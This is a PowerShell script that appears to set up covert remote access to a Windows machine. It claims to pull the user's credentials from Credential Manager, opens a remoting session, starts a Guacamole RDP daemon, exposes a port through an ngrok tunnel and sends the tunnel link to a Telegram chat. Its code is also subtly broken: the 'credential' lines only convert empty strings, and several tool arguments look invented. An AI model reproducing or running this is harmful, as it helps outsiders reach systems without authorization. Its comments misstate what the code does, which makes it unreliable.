# Import necessary assemblies
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Runtime.InteropServices

# Define the target system information
$targetSystemName = $env:COMPUTERNAME

# Get the current username and password from the Windows Credential Manager
$username = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Security.SecureString)))
$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Security.SecureString)))

# Define credentials
$credentials = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))

# Retrieve system credentials
$systemCredentials = Get-WmiObject -Class Win32_LogonSession -ComputerName $targetSystemName -Credential $credentials

# Establish PowerShell Remoting connection
Enter-PSSession -ComputerName $targetSystemName -Credential $credentials

# Start Guacamole RDP connection
Start-Process -FilePath "C:\Path\To\Guacamole\guacd.exe" -ArgumentList "--layer=rdp --username=$username --password=$password"

# Start ngrok tunnel
Start-Process -FilePath "C:\Path\To\ngrok\ngrok.exe" -ArgumentList "http 8080 -host-header=localhost:8080"

# Get ngrok forwarding link
$ngrokLink = (ngrok http 8080 -host-header="localhost:8080" | Select-String -Pattern "http://[a-zA-Z0-9].ngrok.io").Matches.Value

# Share link on Telegram
telegram-cli -W -t "Your Telegram Bot Token" -c "Your Telegram Chat ID" -m "RDP Connection: $ngrokLink"

# Clean up
Exit-PSSession
